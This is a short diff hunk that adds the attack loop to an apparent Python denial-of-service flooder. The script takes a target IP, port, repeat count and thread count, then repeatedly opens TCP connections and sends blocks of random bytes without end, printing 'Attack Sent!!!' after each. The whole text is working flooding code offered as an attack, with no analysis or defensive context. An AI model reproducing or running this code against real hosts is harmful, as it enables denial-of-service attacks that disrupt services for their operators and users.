@@ -64,3 +64,15 @@ times = int(input(" Time :"))
 threads = int(input(" Threads :"))
 def run():
 	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
